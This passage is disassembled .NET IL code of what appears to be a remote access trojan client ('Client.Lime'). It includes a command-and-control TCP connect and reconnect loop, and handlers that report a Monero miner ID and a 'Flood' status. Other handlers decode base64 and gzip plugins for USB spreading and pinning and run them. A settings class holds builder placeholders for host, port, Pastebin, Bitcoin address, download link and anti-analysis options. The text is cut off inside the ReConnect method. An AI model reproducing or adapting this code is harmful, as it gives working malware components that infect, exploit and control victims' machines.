      IL_00ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception,
                                                                                                                           int32)
      IL_00f2:  stloc.s    V_6
      IL_00f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f9:  leave.s    IL_00fb

    }  // end handler
    IL_00fb:  nop
    .try
    {
      IL_00fc:  ldloc.2
      IL_00fd:  call       string Client.Lime.C_ID::XMR()
      IL_0102:  ldc.i4.0
      IL_0103:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0108:  brfalse.s  IL_012f

      IL_010a:  call       string Client.Lime.C_ID::XMR()
      IL_010f:  stloc.2
      IL_0110:  ldstr      "!X"
      IL_0115:  ldsfld     object Client.Lime.C_Main::SPL
      IL_011a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_011f:  ldloc.2
      IL_0120:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0125:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_012a:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_012f:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0131:  dup
      IL_0132:  ldloc.s    V_4
      IL_0134:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception,
                                                                                                                           int32)
      IL_0139:  stloc.s    V_7
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0142

    }  // end handler
    IL_0142:  nop
    .try
    {
      IL_0143:  ldloc.3
      IL_0144:  ldstr      "Flood"
      IL_0149:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_014e:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_0153:  ldc.i4.0
      IL_0154:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0159:  brfalse.s  IL_01a5

      IL_015b:  ldstr      "Flood"
      IL_0160:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0165:  stloc.3
      IL_0166:  ldstr      "MSG"
      IL_016b:  ldsfld     object Client.Lime.C_Main::SPL
      IL_0170:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0175:  ldstr      "Flood! "
      IL_017a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_017f:  ldloc.3
      IL_0180:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0185:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_018a:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_018f:  ldstr      ""
      IL_0194:  stloc.3
      IL_0195:  ldstr      "Flood"
      IL_019a:  ldstr      ""
      IL_019f:  call       object Client.Lime.C_Fuctions::STV(string,
                                                              string)
      IL_01a4:  pop
      IL_01a5:  leave      IL_0037

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01aa:  dup
      IL_01ab:  ldloc.s    V_4
      IL_01ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception,
                                                                                                                           int32)
      IL_01b2:  stloc.s    V_8
      IL_01b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b9:  leave      IL_0037

    }  // end handler
    IL_01be:  ldc.i4     0x1388
    IL_01c3:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01c8:  br         IL_0037
  } // end of method C_Main::Checking

  .method private static void  StartSP() cil managed
  {
    // Code size       153 (0x99)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldstr      "_USB"
      IL_0005:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_000a:  ldnull
      IL_000b:  ldc.i4.0
      IL_000c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0011:  brtrue.s   IL_003c

      IL_0013:  ldsfld     bool Client.Lime.C_TcpClient::isConnected
      IL_0018:  brfalse.s  IL_0030

      IL_001a:  ldc.i4     0x2328
      IL_001f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0024:  ldstr      "PLUSB"
      IL_0029:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_002e:  br.s       IL_005a

      IL_0030:  ldc.i4     0x1388
      IL_0035:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_003a:  br.s       IL_0013

      IL_003c:  ldstr      "_USB"
      IL_0041:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0046:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_004b:  ldc.i4.0
      IL_004c:  stloc.0
      IL_004d:  ldloca.s   V_0
      IL_004f:  call       uint8[] Client.Lime.C_Fuctions::GZip(uint8[],
                                                                bool&)
      IL_0054:  ldnull
      IL_0055:  call       void Client.Lime.C_Commands::Plugin(uint8[],
                                                               string)
      IL_005a:  leave.s    IL_0098

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005c:  dup
      IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0062:  stloc.1
      IL_0063:  ldstr      "MSG"
      IL_0068:  ldsfld     object Client.Lime.C_Main::SPL
      IL_006d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0072:  ldstr      "_USB Error! "
      IL_0077:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_007c:  ldloc.1
      IL_007d:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_0082:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0087:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_008c:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0096:  leave.s    IL_0098

    }  // end handler
    IL_0098:  ret
  } // end of method C_Main::StartSP

  .method private static void  StartPIN() cil managed
  {
    // Code size       153 (0x99)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldstr      "_PIN"
      IL_0005:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_000a:  ldnull
      IL_000b:  ldc.i4.0
      IL_000c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0011:  brtrue.s   IL_003c

      IL_0013:  ldsfld     bool Client.Lime.C_TcpClient::isConnected
      IL_0018:  brfalse.s  IL_0030

      IL_001a:  ldc.i4     0x2af8
      IL_001f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0024:  ldstr      "PLPIN"
      IL_0029:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_002e:  br.s       IL_005a

      IL_0030:  ldc.i4     0x1388
      IL_0035:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_003a:  br.s       IL_0013

      IL_003c:  ldstr      "_PIN"
      IL_0041:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0046:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_004b:  ldc.i4.0
      IL_004c:  stloc.0
      IL_004d:  ldloca.s   V_0
      IL_004f:  call       uint8[] Client.Lime.C_Fuctions::GZip(uint8[],
                                                                bool&)
      IL_0054:  ldnull
      IL_0055:  call       void Client.Lime.C_Commands::Plugin(uint8[],
                                                               string)
      IL_005a:  leave.s    IL_0098

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005c:  dup
      IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0062:  stloc.1
      IL_0063:  ldstr      "MSG"
      IL_0068:  ldsfld     object Client.Lime.C_Main::SPL
      IL_006d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0072:  ldstr      "_PIN Error! "
      IL_0077:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_007c:  ldloc.1
      IL_007d:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_0082:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0087:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_008c:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0096:  leave.s    IL_0098

    }  // end handler
    IL_0098:  ret
  } // end of method C_Main::StartPIN

} // end of class Client.Lime.C_Main

.class public auto ansi Client.Lime.C_Nosleep
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested public EXECUTION_STATE
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype Client.Lime.C_Nosleep/EXECUTION_STATE ES_SYSTEM_REQUIRED = int32(0x00000001)
    .field public static literal valuetype Client.Lime.C_Nosleep/EXECUTION_STATE ES_DISPLAY_REQUIRED = int32(0x00000002)
    .field public static literal valuetype Client.Lime.C_Nosleep/EXECUTION_STATE ES_CONTINUOUS = int32(0x80000000)
  } // end of class EXECUTION_STATE

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_Nosleep::.ctor

  .method public static pinvokeimpl("kernel32" nomangle ansi lasterr winapi) 
          valuetype Client.Lime.C_Nosleep/EXECUTION_STATE 
          SetThreadExecutionState(valuetype Client.Lime.C_Nosleep/EXECUTION_STATE esflags) cil managed preservesig
  {
  }
  .method public static valuetype Client.Lime.C_Nosleep/EXECUTION_STATE 
          No_Sleep() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldc.i4     0x80000003
    IL_0005:  call       valuetype Client.Lime.C_Nosleep/EXECUTION_STATE Client.Lime.C_Nosleep::SetThreadExecutionState(valuetype Client.Lime.C_Nosleep/EXECUTION_STATE)
    IL_000a:  ret
  } // end of method C_Nosleep::No_Sleep

} // end of class Client.Lime.C_Nosleep

.class public auto ansi beforefieldinit Client.Lime.C_Settings
       extends [mscorlib]System.Object
{
  .field public static string Pastebin
  .field public static string HOST
  .field public static int32 PORT
  .field public static string EncryptionKey
  .field public static string ENDOF
  .field public static string SPL
  .field public static string EXE
  .field public static class [mscorlib]System.Threading.Mutex MTX
  .field public static bool USB
  .field public static bool PIN
  .field public static bool ANTI
  .field public static bool DROP
  .field public static string PATH1
  .field public static string PATH2
  .field public static object fullpath
  .field public static string BTC_ADDR
  .field public static bool DWN_CHK
  .field public static string DWN_LINK
  .field public static int32 Delay
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       211 (0xd3)
    .maxstack  3
    IL_0000:  ldstr      "%Pastebin%"
    IL_0005:  stsfld     string Client.Lime.C_Settings::Pastebin
    IL_000a:  ldstr      "%PASS%"
    IL_000f:  stsfld     string Client.Lime.C_Settings::EncryptionKey
    IL_0014:  ldstr      "%KEY%"
    IL_0019:  stsfld     string Client.Lime.C_Settings::ENDOF
    IL_001e:  ldstr      "%SPL%"
    IL_0023:  stsfld     string Client.Lime.C_Settings::SPL
    IL_0028:  ldstr      "%EXE%"
    IL_002d:  stsfld     string Client.Lime.C_Settings::EXE
    IL_0032:  ldstr      "%USB%"
    IL_0037:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_003c:  stsfld     bool Client.Lime.C_Settings::USB
    IL_0041:  ldstr      "%PIN%"
    IL_0046:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_004b:  stsfld     bool Client.Lime.C_Settings::PIN
    IL_0050:  ldstr      "%ANTI%"
    IL_0055:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005a:  stsfld     bool Client.Lime.C_Settings::ANTI
    IL_005f:  ldstr      "%DROP%"
    IL_0064:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0069:  stsfld     bool Client.Lime.C_Settings::DROP
    IL_006e:  ldstr      "%PATH1%"
    IL_0073:  stsfld     string Client.Lime.C_Settings::PATH1
    IL_0078:  ldstr      "%PATH2%"
    IL_007d:  stsfld     string Client.Lime.C_Settings::PATH2
    IL_0082:  ldsfld     string Client.Lime.C_Settings::PATH1
    IL_0087:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_008c:  ldsfld     string Client.Lime.C_Settings::PATH2
    IL_0091:  ldsfld     string Client.Lime.C_Settings::EXE
    IL_0096:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_009b:  stsfld     object Client.Lime.C_Settings::fullpath
    IL_00a0:  ldstr      "%BTC_ADDR%"
    IL_00a5:  stsfld     string Client.Lime.C_Settings::BTC_ADDR
    IL_00aa:  ldstr      "%DWN_CHK%"
    IL_00af:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00b4:  stsfld     bool Client.Lime.C_Settings::DWN_CHK
    IL_00b9:  ldstr      "%DWN_LINK%"
    IL_00be:  stsfld     string Client.Lime.C_Settings::DWN_LINK
    IL_00c3:  ldstr      "%Delay%"
    IL_00c8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_00cd:  stsfld     int32 Client.Lime.C_Settings::Delay
    IL_00d2:  ret
  } // end of method C_Settings::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_Settings::.ctor

} // end of class Client.Lime.C_Settings

.class public auto ansi beforefieldinit Client.Lime.C_TcpClient
       extends [mscorlib]System.Object
{
  .class auto ansi serializable sealed nested assembly _Closure$__
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public static initonly class Client.Lime.C_TcpClient/_Closure$__ $I
    .field public static class [mscorlib]System.Threading.ParameterizedThreadStart '$IR12-1'
    .field public static class [mscorlib]System.Threading.TimerCallback '$IR13-2'
    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method _Closure$__::.ctor

    .method private specialname rtspecialname static 
            void  .cctor() cil managed
    {
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  newobj     instance void Client.Lime.C_TcpClient/_Closure$__::.ctor()
      IL_0005:  stsfld     class Client.Lime.C_TcpClient/_Closure$__ Client.Lime.C_TcpClient/_Closure$__::$I
      IL_000a:  ret
    } // end of method _Closure$__::.cctor

    .method assembly specialname instance void 
            '_Lambda$__R12-1'(object a0) cil managed
    {
      // Code size       12 (0xc)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  castclass  uint8[]
      IL_0006:  call       void Client.Lime.C_Commands::Data(uint8[])
      IL_000b:  ret
    } // end of method _Closure$__::'_Lambda$__R12-1'

    .method assembly specialname instance void 
            '_Lambda$__R13-2'(object a0) cil managed
    {
      // Code size       6 (0x6)
      .maxstack  8
      IL_0000:  call       void Client.Lime.C_TcpClient::PING()
      IL_0005:  ret
    } // end of method _Closure$__::'_Lambda$__R13-2'

  } // end of class _Closure$__

  .field public static string ENDOF
  .field public static string SPL
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static class [mscorlib]System.Random R
  .field public static class [mscorlib]System.Threading.Thread T1
  .field public static bool isConnected
  .field public static class [mscorlib]System.IO.MemoryStream MS
  .field public static class [mscorlib]System.Threading.Timer Tick
  .field public static int32 x
  .field public static class [mscorlib]System.Collections.Generic.List`1<int32> P
  .field public static bool P_Stop
  .field public static bool P_Start
  .field public static int32 i
  .field public static int32 KAP
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  2
    IL_0000:  ldsfld     string Client.Lime.C_Settings::ENDOF
    IL_0005:  stsfld     string Client.Lime.C_TcpClient::ENDOF
    IL_000a:  ldsfld     string Client.Lime.C_Settings::SPL
    IL_000f:  stsfld     string Client.Lime.C_TcpClient::SPL
    IL_0014:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0019:  stsfld     class [mscorlib]System.Random Client.Lime.C_TcpClient::R
    IL_001e:  ldnull
    IL_001f:  ldftn      void Client.Lime.C_TcpClient::Connect()
    IL_0025:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_002a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_002f:  stsfld     class [mscorlib]System.Threading.Thread Client.Lime.C_TcpClient::T1
    IL_0034:  ldc.i4.0
    IL_0035:  stsfld     bool Client.Lime.C_TcpClient::isConnected
    IL_003a:  ldnull
    IL_003b:  stsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
    IL_0040:  ldnull
    IL_0041:  stsfld     class [mscorlib]System.Threading.Timer Client.Lime.C_TcpClient::Tick
    IL_0046:  ldc.i4.0
    IL_0047:  stsfld     int32 Client.Lime.C_TcpClient::x
    IL_004c:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<int32>::.ctor()
    IL_0051:  stsfld     class [mscorlib]System.Collections.Generic.List`1<int32> Client.Lime.C_TcpClient::P
    IL_0056:  ldc.i4.0
    IL_0057:  stsfld     bool Client.Lime.C_TcpClient::P_Stop
    IL_005c:  ldc.i4.0
    IL_005d:  stsfld     bool Client.Lime.C_TcpClient::P_Start
    IL_0062:  ldc.i4.0
    IL_0063:  stsfld     int32 Client.Lime.C_TcpClient::i
    IL_0068:  ldc.i4.0
    IL_0069:  stsfld     int32 Client.Lime.C_TcpClient::KAP
    IL_006e:  ret
  } // end of method C_TcpClient::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_TcpClient::.ctor

  .method public static void  Connect() cil managed
  {
    // Code size       467 (0x1d3)
    .maxstack  10
    .locals init (uint8[] V_0,
             class [mscorlib]System.Array V_1,
             class [mscorlib]System.Exception V_2)
    IL_0000:  nop
    .try
    {
      IL_0001:  ldc.i4.1
      IL_0002:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0007:  ldsfld     int32 Client.Lime.C_TcpClient::x
      IL_000c:  ldc.i4.1
      IL_000d:  add.ovf
      IL_000e:  stsfld     int32 Client.Lime.C_TcpClient::x
      IL_0013:  ldsfld     int32 Client.Lime.C_TcpClient::x
      IL_0018:  ldc.i4     0xc8
      IL_001d:  bne.un.s   IL_0055

      IL_001f:  ldc.i4.0
      IL_0020:  stsfld     int32 Client.Lime.C_TcpClient::x
      IL_0025:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_002a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_002f:  ldc.i4.m1
      IL_0030:  ldc.i4.0
      IL_0031:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0036:  brfalse.s  IL_0044

      IL_0038:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_003d:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0042:  brfalse.s  IL_0050

      IL_0044:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_0049:  callvirt   instance bool [System]System.Net.Sockets.TcpClient::get_Connected()
      IL_004e:  brtrue.s   IL_0055

      IL_0050:  leave      IL_01a4

      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_0191

      IL_0065:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_006a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_006f:  ldc.i4.1
      IL_0070:  sub.ovf
      IL_0071:  ldc.i4.1
      IL_0072:  add.ovf
      IL_0073:  newarr     [mscorlib]System.Byte
      IL_0078:  stloc.0
      IL_0079:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_007e:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0083:  ldloc.0
      IL_0084:  ldc.i4.0
      IL_0085:  ldloc.0
      IL_0086:  ldlen
      IL_0087:  conv.i4
      IL_0088:  ldc.i4.0
      IL_0089:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_008e:  pop
      IL_008f:  ldsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_0094:  ldloc.0
      IL_0095:  ldc.i4.0
      IL_0096:  ldloc.0
      IL_0097:  ldlen
      IL_0098:  conv.i4
      IL_0099:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_009e:  ldsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_00a3:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_00a8:  call       string Client.Lime.C_Fuctions::BS(uint8[])
      IL_00ad:  ldsfld     string Client.Lime.C_TcpClient::ENDOF
      IL_00b2:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00b7:  brfalse    IL_0191

      IL_00bc:  ldsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_00c1:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_00c6:  ldsfld     string Client.Lime.C_TcpClient::ENDOF
      IL_00cb:  call       class [mscorlib]System.Array Client.Lime.C_Fuctions::fx(uint8[],
                                                                                   string)
      IL_00d0:  stloc.1
      IL_00d1:  ldsfld     class [mscorlib]System.Threading.ParameterizedThreadStart Client.Lime.C_TcpClient/_Closure$__::'$IR12-1'
      IL_00d6:  brfalse.s  IL_00df

      IL_00d8:  ldsfld     class [mscorlib]System.Threading.ParameterizedThreadStart Client.Lime.C_TcpClient/_Closure$__::'$IR12-1'
      IL_00dd:  br.s       IL_00f5

      IL_00df:  ldsfld     class Client.Lime.C_TcpClient/_Closure$__ Client.Lime.C_TcpClient/_Closure$__::$I
      IL_00e4:  ldftn      instance void Client.Lime.C_TcpClient/_Closure$__::'_Lambda$__R12-1'(object)
      IL_00ea:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_00ef:  dup
      IL_00f0:  stsfld     class [mscorlib]System.Threading.ParameterizedThreadStart Client.Lime.C_TcpClient/_Closure$__::'$IR12-1'
      IL_00f5:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart)
      IL_00fa:  ldloc.1
      IL_00fb:  ldc.i4.1
      IL_00fc:  newarr     [mscorlib]System.Object
      IL_0101:  dup
      IL_0102:  ldc.i4.0
      IL_0103:  ldc.i4.0
      IL_0104:  box        [mscorlib]System.Int32
      IL_0109:  stelem.ref
      IL_010a:  ldnull
      IL_010b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_0110:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0115:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_011a:  ldsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_011f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0124:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0129:  stsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_012e:  ldloc.1
      IL_012f:  callvirt   instance int32 [mscorlib]System.Array::get_Length()
      IL_0134:  ldc.i4.2
      IL_0135:  bne.un.s   IL_0191

      IL_0137:  ldsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_013c:  ldloc.1
      IL_013d:  ldc.i4.1
      IL_013e:  newarr     [mscorlib]System.Object
      IL_0143:  dup
      IL_0144:  ldc.i4.0
      IL_0145:  ldc.i4.1
      IL_0146:  box        [mscorlib]System.Int32
      IL_014b:  stelem.ref
      IL_014c:  ldnull
      IL_014d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_0152:  castclass  uint8[]
      IL_0157:  ldc.i4.0
      IL_0158:  ldloc.1
      IL_0159:  ldc.i4.1
      IL_015a:  newarr     [mscorlib]System.Object
      IL_015f:  dup
      IL_0160:  ldc.i4.0
      IL_0161:  ldc.i4.1
      IL_0162:  box        [mscorlib]System.Int32
      IL_0167:  stelem.ref
      IL_0168:  ldnull
      IL_0169:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_016e:  ldnull
      IL_016f:  ldstr      "length"
      IL_0174:  ldc.i4.0
      IL_0175:  newarr     [mscorlib]System.Object
      IL_017a:  ldnull
      IL_017b:  ldnull
      IL_017c:  ldnull
      IL_017d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0182:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
      IL_0187:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_018c:  br         IL_009e

      IL_0191:  leave      IL_0000

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0196:  dup
      IL_0197:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019c:  stloc.2
      IL_019d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a2:  leave.s    IL_01a4

    }  // end handler
    IL_01a4:  ldc.i4.0
    IL_01a5:  stsfld     bool Client.Lime.C_TcpClient::isConnected
    IL_01aa:  br.s       IL_01c6

    IL_01ac:  ldsfld     class [mscorlib]System.Random Client.Lime.C_TcpClient::R
    IL_01b1:  ldc.i4     0x1388
    IL_01b6:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
    IL_01bb:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01c0:  call       object Client.Lime.C_TcpClient::ReConnect()
    IL_01c5:  pop
    IL_01c6:  ldsfld     bool Client.Lime.C_TcpClient::isConnected
    IL_01cb:  brfalse.s  IL_01ac

    IL_01cd:  call       void Client.Lime.C_TcpClient::Connect()
    IL_01d2:  ret
  } // end of method C_TcpClient::Connect

  .method public static object  ReConnect() cil managed
  {
    // Code size       766 (0x2fe)
    .maxstack  7
